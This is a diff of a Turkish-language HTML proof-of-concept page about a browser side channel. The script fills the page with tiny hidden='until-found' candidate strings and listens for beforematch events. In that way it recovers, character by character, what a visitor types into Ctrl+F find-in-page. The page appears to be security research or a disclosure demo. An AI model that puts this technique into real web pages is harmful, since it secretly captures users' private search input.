@@ -8,46 +8,37 @@
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
 
 <style>
-  body {
-    background:#f8f9fa;
-    color:#212529;
-  }
-  .card {
-    border-radius: 10px;
-  }
+  body { background:#f8f9fa; color:#212529; }
+  .card { border-radius:10px; }
   .log {
-    background:#ffffff;
+    background:#fff;
     font-family: monospace;
-    font-size: 14px;
-    padding: 12px;
-    border-radius: 8px;
-    min-height: 90px;
-    border: 1px solid #dee2e6;
+    font-size:14px;
+    padding:12px;
+    border-radius:8px;
+    min-height:90px;
+    border:1px solid #dee2e6;
   }
-  code {
-    color:#0d6efd;
-  }
+  code { color:#0d6efd; }
 </style>
 </head>
 <body>
 
 <div class="container my-5">
 
-  <!-- Talimat -->
   <div class="card shadow-sm mb-4">
     <div class="card-body">
       <h4>🔍 Ctrl+F Testi</h4>
       <p class="mb-1">
-        Klavyeden <strong>Ctrl + F</strong> yapın ve şunu yazın:
+        <strong>Ctrl + F</strong> yap ve şunu yaz:
       </p>
       <h5 class="text-primary">beykozunsesi</h5>
       <p class="text-muted mb-0">
-        Input yok · keydown yok · izin yok
+        input yok · keydown yok · izin yok
       </p>
     </div>
   </div>
 
-  <!-- Sonuç -->
   <div class="card shadow-sm mb-4">
     <div class="card-body">
       <h6>📡 Algılanan Arama Dizisi</h6>
@@ -57,34 +48,27 @@
     </div>
   </div>
 
-  <!-- Açıklama -->
   <div class="card shadow-sm">
     <div class="card-body">
       <h5>🧠 Burada Ne Oluyor?</h5>
       <p>
-        Bu PoC, tarayıcıların <code>hidden="until-found"</code> özelliğinin
-        Ctrl+F (Sayfada Bul) sırasında DOM üzerinde nasıl izlenebilir
-        bir yan kanal (side-channel) oluşturduğunu gösterir.
+        Bu PoC, <code>hidden="until-found"</code> özelliğinin
+        Ctrl+F sırasında bir yan kanal oluşturduğunu gösterir.
       </p>
       <ul>
-        <li>Gizli HTML elementleri Ctrl+F tarafından indekslenir</li>
-        <li>Eşleşme olunca tarayıcı elementi görünür yapar</li>
+        <li>Gizli elementler Ctrl+F tarafından indekslenir</li>
+        <li>Eşleşince görünür olur</li>
         <li><code>beforematch</code> olayı tetiklenir</li>
-        <li>JavaScript bu olayı dinleyerek aramayı çözer</li>
+        <li>JavaScript aramayı çözer</li>
       </ul>
     </div>
   </div>
 
 </div>
 
-<!-- ⚠️ KRİTİK NOKTA: layout içinde, görünmez ama render ediliyor -->
+<!-- ⚠️ KRİTİK: layout içinde, render ediliyor ama görünmüyor -->
 <div id="search-candidates"
-     style="
-       font-size:1px;
-       line-height:1px;
-       height:1px;
-       overflow:hidden;
-     ">
+     style="font-size:1px; line-height:1px; height:1px; overflow:hidden;">
 </div>
 
 <script>
@@ -92,21 +76,14 @@ let detectedSequence = "";
 const detected = new Set();
 let container;
 
-/* Eski adayları temizle */
 function cleanupOldCandidates(len) {
-  if (!container) return;
   container.querySelectorAll('p[id^="c_"]').forEach(el => {
     const l = el.getAttribute("data-sequence").length;
-    if (l !== 1 && (l < len || l > len + 1)) {
-      el.remove();
-    }
+    if (l !== 1 && (l < len || l > len + 1)) el.remove();
   });
 }
 
-/* Yeni adaylar üret */
 function generateCandidates(prefix = "") {
-  if (!container) return;
-
   const charset =
     "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
 
@@ -120,12 +97,16 @@ function generateCandidates(prefix = "") {
 
     const p = document.createElement("p");
 
-    /* 🔴 ASIL OLAY */
+    /* 🔴 ASIL FIX BURADA */
     p.setAttribute("hidden", "until-found");
 
     p.id = id;
     p.setAttribute("data-sequence", seq);
-    p.textContent = seq.endsWith(" ") ? seq + "\u200B" : seq;
+
+    /* ZERO WIDTH SPACE */
+    p.textContent = seq.endsWith(" ")
+      ? seq + "\u200B"
+      : seq;
 
     p.style.fontSize = "1px";
     p.style.margin = "0";
@@ -137,7 +118,7 @@ function generateCandidates(prefix = "") {
 
       if (current.length === 1) {
         detectedSequence = current;
-        document.getElementById("result").textContent = current;
+        result.textContent = current;
         detected.add(id);
         generateCandidates(current);
         return;
@@ -154,7 +135,7 @@ function generateCandidates(prefix = "") {
         }
 
         detectedSequence = current;
-        document.getElementById("result").textContent = current;
+        result.textContent = current;
         generateCandidates(current);
       }
     });
